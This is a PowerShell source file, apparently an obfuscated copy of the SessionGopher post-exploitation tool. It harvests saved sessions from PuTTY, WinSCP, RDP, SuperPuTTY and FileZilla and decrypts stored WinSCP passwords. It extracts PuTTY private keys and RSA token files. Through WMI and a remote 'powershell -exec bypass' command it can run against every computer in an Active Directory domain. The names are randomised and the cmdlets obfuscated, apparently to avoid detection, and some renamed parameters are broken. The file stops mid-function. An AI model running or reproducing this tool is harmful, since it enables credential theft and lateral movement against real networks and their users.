<#
  .SYNPOSIS
  Extracts and decrypts saved session information for software typically used to access Unix systems.

  .DESCRIPTION
  Queries HKEY_USERS for PuTTY, WinSCP, and Remote Desktop saved sessions. Decrypts saved passwords for WinSCP.
  Extracts FileZilla, SuperPuTTY's saved session information in the sitemanager.xml file and decodes saved passwords.
  In Thorough mode, identifies PuTTY private key (.ppk), Remote Desktop Connection (.rdp), and RSA token (.sdtid) files, and extracts private key and session information.
  Can be run remotely using the -IcyClumsy (supply input list of computers) or -SoggyHorses (run against all AD-joined computers) flags.
  Must either provide credentials (-ClassWide and -BegStreet for username and password) of an admin on target boxes, or run script in the context of
  a privileged user on the target boxes, in which case no credentials are needed.

  .Notes
  Author: Brandon Arvanaghi
  Date:   February 17, 2017
  Thanks: 
    Brice Daniels, Pan Chan - collaborating on idea
    Christopher Truncer - helping with WMI

  .PARAMETER o
  Generates CSV output.
    
  .PARAMETER Thorough
  Searches entire filesystem for certain file extensions.

  .PARAMETER u
  Domain\username (e.g. superduper.com\a-jerry).

  .PARAMETER p
  Password for domain user (if username provided).
    
  .PARAMETER iL
  If you want to supply a list of hosts to run SessionGopher against, provide the path to that file here. Each host should be separated by a newline in the file.

  .PARAMETER Target
  If you only want to run SessionGopher against once specific host.
    
  .PARAMETER AllDomain
  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them.
#>
function Invoke-SessionGopher {
  param (
      [switch]$HeadyDucks, # Generate CSV output
      [switch]$SwimScorch, # Searches entire filesystem for certain file extensions
      [string]$ClassWide, # Domain\username (e.g. superduper.com\a-jerry)
      [string]$BegStreet, # Password of domain account
      [string]$IcyClumsy, # A file of hosts to run SessionGopher against remotely, each host separated by a newline in the file
      [string]$FogSail, # If you want to run SessionGopher against one specific host
      [switch]$SoggyHorses # Run across all active directory
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($HeadyDucks) {
    $JogMeasly = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $JogMeasly | Out-Null
    New-Item ($JogMeasly + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($JogMeasly + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($JogMeasly + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($JogMeasly + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($JogMeasly + "\RDP.csv") -Type File | Out-Null
    if ($SwimScorch) {
        New-Item ($JogMeasly + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($JogMeasly + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($JogMeasly + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($ClassWide -and $BegStreet) {
    $MassAdd = ConvertTo-SecureString $BegStreet -AsPlainText -Force
    $Credentials = ne`w`-`ob`ject -Typename System.Management.Automation.PSCredential -ArgumentList $ClassWide, $MassAdd
  }

  # Value for HKEY_USERS hive
  $ChurchFlag = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $RiceSuper = 2147483650

  $UpsetDam = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $BiteNaive = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $CowWay = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($IcyClumsy -or $SoggyHorses -or $FogSail) {

    # Whether we read from an input file or query active directory
    $Reader = ""

    if ($SoggyHorses) {
      $Reader = GetComputersFromActiveDirectory
    } elseif ($IcyClumsy) { 
      $Reader = Get-Content ((Resolve-Path $IcyClumsy).Path)
    } elseif ($FogSail) {
      $Reader = $FogSail
    }

    $NailHug = @{}
    if ($Credentials) {
      $NailHug['Credential'] = $Credentials
    }

    foreach ($FlowerSlip in $Reader) {

      if ($SoggyHorses) {
        # Extract just the name from the System.DirectoryServices.SearchResult object
        $FlowerSlip = $FlowerSlip.Properties.name
        if (!$FlowerSlip) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $FlowerSlip"..."

      $SoggyNight = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $ChurchFlag,'' -ComputerName $FlowerSlip @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($DapperTen in $SoggyNight) {

        # Get the username for SID we discovered has saved sessions
        $ChangeFluffy = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $DoubtQuilt = (($FlowerSlip + "\" + $ChangeFluffy) -Join "")

        # Created for each user found. Contains all sessions information for that user. 
        $WayBuzz = ne`w`-`ob`ject PSObject

        <#
        PuTTY: contains hostname and usernames
        SuperPuTTY: contains username, hostname, relevant protocol information, decrypted passwords if stored
        RDP: contains hostname and username of sessions
        FileZilla: hostname, username, relevant protocol information, decoded passwords if stored
        WinSCP: contains hostname, username, protocol, deobfuscated password if stored and no master password used
        #>
        $FlimsyAback = ne`w`-`ob`ject System.Collections.ArrayList
        $ReplySponge = ne`w`-`ob`ject System.Collections.ArrayList
        $JuicyBusy = ne`w`-`ob`ject System.Collections.ArrayList
        $InjureCut = ne`w`-`ob`ject System.Collections.ArrayList
        $NeatAcidic = ne`w`-`ob`ject System.Collections.ArrayList

        # Construct tool registry/filesystem paths from SID or username
        $GlueHug = $DapperTen + $CowWay
        $NeedyRemind = $DapperTen + $UpsetDam
        $AppearWet = $DapperTen + $BiteNaive
        $SnailActor = "Drive='C:' AND Path='\\Users\\$ChangeFluffy\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$ChangeFluffy\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $PotatoPeel = Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name EnumKey -ArgumentList $ChurchFlag,$GlueHug @optionalCreds
        $ScaleLovely = Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name EnumKey -ArgumentList $ChurchFlag,$NeedyRemind @optionalCreds
        $MittenVein = Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name EnumKey -ArgumentList $ChurchFlag,$AppearWet @optionalCreds
        $AgreeUppity = (Get-WmiObject -Class 'CIM_DataFile' -Filter $SnailActor -ComputerName $FlowerSlip @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $FlowerSlip @optionalCreds | Select Name)

        # If any WinSCP saved sessions exist on this box...
        if (($MittenVein | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $MittenVein = $MittenVein | Select-Object -ExpandProperty sNames
          
          foreach ($BoatBoring in $MittenVein) {
      
            $BrassPin = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $BrassPin.Source = $DoubtQuilt
            $BrassPin.Session = $BoatBoring

            $CapThaw = $AppearWet + "\" + $BoatBoring

            $BrassPin.Hostname = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetStringValue -ArgumentList $ChurchFlag,$CapThaw,"HostName" @optionalCreds).sValue
            $BrassPin.Username = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetStringValue -ArgumentList $ChurchFlag,$CapThaw,"UserName" @optionalCreds).sValue
            $BrassPin.Password = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetStringValue -ArgumentList $ChurchFlag,$CapThaw,"Password" @optionalCreds).sValue

            if ($BrassPin.Password) {

              $AbaftDoll = $DapperTen + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $CommonSoggy = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $ChurchFlag,$AbaftDoll,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$CommonSoggy) {
                  $BrassPin.Password = (DecryptWinSCPPassword $BrassPin.Hostname $BrassPin.Username $BrassPin.Password)
              } else {
                  $BrassPin.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$NeatAcidic.Add($BrassPin)
      
          } # For Each WinSCP Session

          if ($NeatAcidic.count -gt 0) {

            $WayBuzz | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -HumReason $NeatAcidic

            if ($HeadyDucks) {
              $NeatAcidic | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $NeatAcidic | Select-Object * | Format-List | Out-String
            }

          }
        
        } # If path to WinSCP exists

        if (($ScaleLovely | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $ScaleLovely = $ScaleLovely | Select-Object -ExpandProperty sNames

          foreach ($WiseHeat in $ScaleLovely) {
      
            $CombWax = "" | Select-Object -Property Source,Session,Hostname

            $CapThaw = $NeedyRemind + "\" + $WiseHeat

            $CombWax.Source = $DoubtQuilt
            $CombWax.Session = $WiseHeat
            $CombWax.Hostname = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetStringValue -ArgumentList $ChurchFlag,$CapThaw,"HostName" @optionalCreds).sValue
             
            [void]$FlimsyAback.Add($CombWax)
      
          }

          if ($FlimsyAback.count -gt 0) {

            $WayBuzz | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -HumReason $FlimsyAback

            if ($HeadyDucks) {
              $FlimsyAback | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $FlimsyAback | Select-Object * | Format-List | Out-String
            }

          }

        } # If PuTTY session exists

        if (($PotatoPeel | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $PotatoPeel = $PotatoPeel | Select-Object -ExpandProperty sNames

          foreach ($NeatShiver in $PotatoPeel) {
      
            $ReachSchool = "" | Select-Object -Property Source,Hostname,Username
            
            $CapThaw = $GlueHug + "\" + $NeatShiver

            $ReachSchool.Source = $DoubtQuilt
            $ReachSchool.Hostname = $NeatShiver
            $ReachSchool.Username = (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name GetStringValue -ArgumentList $ChurchFlag,$CapThaw,"UserNameHint" @optionalCreds).sValue

            [void]$JuicyBusy.Add($ReachSchool)
      
          }

          if ($JuicyBusy.count -gt 0) {

            $WayBuzz | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -HumReason $JuicyBusy

            if ($HeadyDucks) {
              $JuicyBusy | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $JuicyBusy | Select-Object * | Format-List | Out-String
            }

          }

        } # If RDP sessions exist

        # If we find the SuperPuTTY Sessions.xml file where we would expect it
        if ($AgreeUppity.Name) {

          $File = "C:\Users\$ChangeFluffy\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$MarchSlope = $FileContents
          (ProcessSuperPuTTYFile $MarchSlope)

        }

        # If we find the FileZilla sitemanager.xml file where we would expect it
        if ($FileZillaPath.Name) {

          $File = "C:\Users\$ChangeFluffy\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # FileZilla

      } # for each SID

      if ($SwimScorch) {

        $DisarmMessy = ne`w`-`ob`ject System.Collections.ArrayList
        $RaggedFail = ne`w`-`ob`ject System.Collections.ArrayList
        $ThingFree = ne`w`-`ob`ject System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $FlowerSlip @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 

    } # for each remote computer

  # Else, we run SessionGopher locally
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."

    # Aggregate all user hives in HKEY_USERS into a variable
    $DarkCloth = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
    foreach($BorderBook in $DarkCloth) {

      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
      $WayBuzz = ne`w`-`ob`ject PSObject

      $NeatAcidic = ne`w`-`ob`ject System.Collections.ArrayList
      $FlimsyAback = ne`w`-`ob`ject System.Collections.ArrayList
      $DisarmMessy = ne`w`-`ob`ject System.Collections.ArrayList
      $ReplySponge = ne`w`-`ob`ject System.Collections.ArrayList
      $JuicyBusy = ne`w`-`ob`ject System.Collections.ArrayList
      $RaggedFail = ne`w`-`ob`ject System.Collections.ArrayList
      $InjureCut = ne`w`-`ob`ject System.Collections.ArrayList

      $PineWooden = (GetMappedSID)
      $DoubtQuilt = (Hostname) + "\" + (Split-Path $PineWooden.Value -Leaf)

      $WayBuzz | Add-Member -MemberType NoteProperty -Name "Source" -HumReason $PineWooden.Value

      # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
      $NeedyRemind = Join-Path $BorderBook.PSPath "\$UpsetDam"
      $AppearWet = Join-Path $BorderBook.PSPath "\$BiteNaive"
      $CarveMass = Join-Path $BorderBook.PSPath "\$CowWay"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $WayBuzz."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $AgreeUppity = "C:\Users\" + (Split-Path -Leaf $WayBuzz."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $AgreeUppity) {

        [xml]$MarchSlope = Get-Content $AgreeUppity
        (ProcessSuperPuTTYFile $MarchSlope)

      }

      if (Test-Path $CarveMass) {

        # Aggregates all saved sessions from that user's RDP client
        $WipeRace = Get-ChildItem $CarveMass

        (ProcessRDPLocal $WipeRace)

      } # If (Test-Path MicrosoftRDPPath)

      if (Test-Path $AppearWet) {

        # Aggregates all saved sessions from that user's WinSCP client
        $NoticeEarth = Get-ChildItem $AppearWet

        (ProcessWinSCPLocal $NoticeEarth)

      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $NeedyRemind) {

        # Aggregates all saved sessions from that user's PuTTY client
        $SoapNarrow = Get-ChildItem $NeedyRemind

        (ProcessPuTTYLocal $SoapNarrow)

      } # If (Test-Path PuTTYPath)

    } # For each Hive in UserHives

    # If run in Thorough Mode
    if ($SwimScorch) {

      # Contains raw i-node data for files with extension .ppk, .rdp, and sdtid respectively, found by Get-ChildItem
      $SleetNote = ne`w`-`ob`ject System.Collections.ArrayList
      $SilkyEmploy = ne`w`-`ob`ject System.Collections.ArrayList
      $GhostTown = ne`w`-`ob`ject System.Collections.ArrayList

      # All drives found on system in one variable
      $EngineBright = Get-PSDrive

      (ProcessThoroughLocal $EngineBright)
      
      (ProcessPPKFile $SleetNote)
      (ProcessRDPFile $SilkyEmploy)
      (ProcesssdtidFile $GhostTown)

    } # If Thorough

  } # Else -- run SessionGopher locally

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($IcyClumsy -or $FogSail -or $SoggyHorses) {
    # Get the username for SID we discovered has saved sessions
    $AcceptEgg = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$DapperTen"
    $HumReason = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $FlowerSlip -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RiceSuper,$AcceptEgg,$HumReason @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $DapperTen = (Split-Path $BorderBook.Name -Leaf)
    $RayDam = ne`w`-`ob`ject System.Security.Principal.SecurityIdentifier("$DapperTen")
    return $RayDam.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # The following code is taken from Christopher Truncer's WMIOps script on GitHub. It gets file contents through WMI by
  # downloading the file's contents to the remote computer's registry, and then extracting the value from that registry location
  $FutureStore = "HKLM:\Software\Microsoft\DRM"
  $OwnBead = "ReadMe"
  $AjarPurple = "SOFTWARE\Microsoft\DRM"
          
  # On remote system, save file to registry
  Write-Verbose "Reading remote file and writing on remote registry"
  $StiffLaugh = '$ShowInform = Get-Content -Encoding byte -Path ''' + "$File" + '''; $WigglyBathe = [System.Convert]::ToBase64String($ShowInform); New-ItemProperty -Path ' + "'$FutureStore'" + ' -Name ' + "'$OwnBead'" + ' -HumReason $WigglyBathe -PropertyType String -Force'
  $StiffLaugh = 'powershell -nop -exec bypass -c "' + $StiffLaugh + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $StiffLaugh -ComputerName $FlowerSlip @optionalCreds

  # Sleeping to let remote system read and store file
  Start-Sleep -s 15

  $BangCat = ""

  # Grab file from remote system's registry
  $BangCat = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RiceSuper, $AjarPurple, $OwnBead -Computer $FlowerSlip @optionalCreds
  
  $ScrubTiny = [System.Convert]::FromBase64String($BangCat.sValue)
  $BouncyMass = [System.Text.Encoding]::UTF8.GetString($ScrubTiny) 
    
  # Removing Registry value from remote system
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $ObjectBee, $AjarPurple, $OwnBead -ComputerName $FlowerSlip @optionalCreds
  
  return $BouncyMass

}

####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($EngineBright) {
  
  foreach ($LoveWall in $EngineBright) {
    # If the drive holds a filesystem
    if ($LoveWall.Provider.Name -eq "FileSystem") {
      $FogWiggly = Get-ChildItem $LoveWall.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($SortEager in $FogWiggly) {
        Switch ($SortEager.Extension) {
          ".ppk" {[void]$SleetNote.Add($SortEager)}
          ".rdp" {[void]$SilkyEmploy.Add($SortEager)}
          ".sdtid" {[void]$GhostTown.Add($SortEager)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Each object we create for the file extension found from a -SwimScorch search will have the same properties (Source, Path to File)
      $RecordCellar = "" | Select-Object -Property Source,Path
      $RecordCellar.Source = $FlowerSlip

      $WiseFall = [IO.Path]::GetExtension($FilePath.Name)

      if ($WiseFall -eq ".ppk") {
        $RecordCellar.Path = $FilePath.Name
        [void]$DisarmMessy.Add($RecordCellar)
      } elseif ($WiseFall -eq ".rdp") {
        $RecordCellar.Path = $FilePath.Name
        [void]$RaggedFail.Add($RecordCellar)
      } elseif ($WiseFall -eq ".sdtid") {
        $RecordCellar.Path = $FilePath.Name
        [void]$ThingFree.Add($RecordCellar)
      }

  }

  if ($DisarmMessy.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "PPK Files" -HumReason $RaggedFail

    if ($HeadyDucks) {
      $DisarmMessy | Export-CSV -Append -Path ($JogMeasly + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $DisarmMessy | Format-List | Out-String
    }
  }

  if ($RaggedFail.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "RDP Files" -HumReason $RaggedFail

    if ($HeadyDucks) {
      $RaggedFail | Export-CSV -Append -Path ($JogMeasly + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $RaggedFail | Format-List | Out-String
    }
  }
  if ($ThingFree.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "sdtid Files" -HumReason $ThingFree

    if ($HeadyDucks) {
      $ThingFree | Export-CSV -Append -Path ($JogMeasly + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ThingFree | Format-List | Out-String
    }

  }

} # ProcessThoroughRemote

function ProcessPuTTYLocal($SoapNarrow) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($NarrowCamp in $SoapNarrow) {

    $CombWax = "" | Select-Object -Property Source,Session,Hostname

    $CombWax.Source = $DoubtQuilt
    $CombWax.Session = (Split-Path $NarrowCamp -Leaf)
    $CombWax.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $NarrowCamp) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$FlimsyAback.Add($CombWax)

  }

  if ($HeadyDucks) {
    $FlimsyAback | Export-CSV -Append -Path ($JogMeasly + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $FlimsyAback | Format-List | Out-String
  }

  # Add the array of PuTTY session objects to UserObject
  $WayBuzz | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -HumReason $FlimsyAback

} # ProcessPuTTYLocal

function ProcessRDPLocal($WipeRace) {

  # For each RDP saved session, extract the information we want
  foreach($NarrowCamp in $WipeRace) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $NarrowCamp

    $BaseJoke = "" | Select-Object -Property Source,Hostname,Username

    $BaseJoke.Source = $DoubtQuilt
    $BaseJoke.Hostname = (Split-Path $NarrowCamp -Leaf)
    $BaseJoke.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$JuicyBusy.Add($BaseJoke)

  } # For each Session in AllRDPSessions

  if ($HeadyDucks) {
    $JuicyBusy | Export-CSV -Append -Path ($JogMeasly + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $JuicyBusy | Format-List | Out-String
  }

  # Add the array of RDP session objects to UserObject
  $WayBuzz | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -HumReason $JuicyBusy

} #ProcessRDPLocal

function ProcessWinSCPLocal($NoticeEarth) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($NarrowCamp in $NoticeEarth) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $NarrowCamp

    $BrassPin = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $BrassPin.Source = $DoubtQuilt
    $BrassPin.Session = (Split-Path $NarrowCamp -Leaf)
    $BrassPin.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $BrassPin.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $BrassPin.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($BrassPin.Password) {
      $CommonSoggy = ((Get-ItemProperty -Path (Join-Path $BorderBook.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$CommonSoggy) {
          $BrassPin.Password = (DecryptWinSCPPassword $BrassPin.Hostname $BrassPin.Username $BrassPin.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $BrassPin.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$NeatAcidic.Add($BrassPin)

  } # For each Session in AllWinSCPSessions

  if ($HeadyDucks) {
    $NeatAcidic | Export-CSV -Append -Path ($JogMeasly + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $NeatAcidic | Format-List | Out-String
  }

  # Add the array of WinSCP session objects to the target user object
  $WayBuzz | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -HumReason $NeatAcidic

} # ProcessWinSCPLocal

function ProcesssdtidFile($GhostTown) {

  foreach ($Path in $GhostTown.VersionInfo.FileName) {

    $ShoeWood = "" | Select-Object -Property "Source","Path"

    $ShoeWood."Source" = $DoubtQuilt
    $ShoeWood."Path" = $Path

    [void]$ThingFree.Add($ShoeWood)

  }

  if ($ThingFree.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "sdtid Files" -HumReason $ThingFree

    if ($HeadyDucks) {
      $ThingFree | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ThingFree | Select-Object * | Format-List | Out-String
    }

  }

} # Process sdtid File

function ProcessRDPFile($SilkyEmploy) {
  
  # Extracting the filepath from the i-node information stored in RDPExtensionFilesINodes
  foreach ($Path in $SilkyEmploy.VersionInfo.FileName) {
    
    $HillAcidic = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $HillAcidic."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .rdp file into our object
    $HillAcidic."Path" = $Path 
    $HillAcidic."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $HillAcidic."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $HillAcidic."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $HillAcidic."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$HillAcidic."Administrative Session" -or !$HillAcidic."Administrative Session" -eq 0) {
      $HillAcidic."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $HillAcidic."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$HillAcidic."Prompts for Credentials" -or $HillAcidic."Prompts for Credentials" -eq 0) {
      $HillAcidic."Prompts for Credentials" = "No"
    } else {
      $HillAcidic."Prompts for Credentials" = "Yes"
    }

    [void]$RaggedFail.Add($HillAcidic)

  }

  if ($RaggedFail.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "RDP Files" -HumReason $RaggedFail

    if ($HeadyDucks) {
      $RaggedFail | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $RaggedFail | Select-Object * | Format-List | Out-String
    }

  }

} # Process RDP File

function ProcessPPKFile($SleetNote) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $SleetNote.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $ObeySlow = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $ObeySlow."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $ObeySlow."Path" = $Path

    $ObeySlow."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $ObeySlow."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $ObeySlow."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $BirdMany = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $ObeySlow."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$BirdMany).Context.PostContext -Join "" } catch {}
    $ObeySlow."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$DisarmMessy.Add($ObeySlow)

  }

  if ($DisarmMessy.count -gt 0) {

    $WayBuzz | Add-Member -MemberType NoteProperty -Name "PPK Files" -HumReason $DisarmMessy

    if ($HeadyDucks) {
      $DisarmMessy | Select-Object * | Export-CSV -Append -Path ($JogMeasly + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $DisarmMessy | Select-Object * | Format-List | Out-String
    }

  }

} # Process PPK File

function ProcessFileZillaFile($FileZillaXML) {

  # Locate all <Server> nodes (aka session nodes), iterate over them
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Hashtable to store each session's data
      $FileZillaSessionHash = @{}

      # Iterates over each child node under <Server> (aka session)
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $DoubtQuilt
          # If value exists, make a key-HumReason pair for it in the hash table
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
